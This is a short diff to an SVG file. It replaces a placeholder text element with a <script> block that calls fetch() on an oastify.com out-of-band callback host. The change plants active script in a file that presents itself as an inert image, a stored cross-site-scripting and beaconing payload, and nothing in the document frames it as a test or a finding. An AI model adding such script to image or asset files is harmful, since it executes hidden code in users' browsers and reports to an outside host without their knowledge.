@@ -1,3 +1,5 @@
 <svg xmlns="http://www.w3.org/2000/svg">
-  <text x="10" y="20">TEST_SVG</text>
+  <script>
+    fetch('https://mc2tsobclk2bzcqjiexe91ycm3swgn4c.oastify.com')
+  </script>
 </svg>
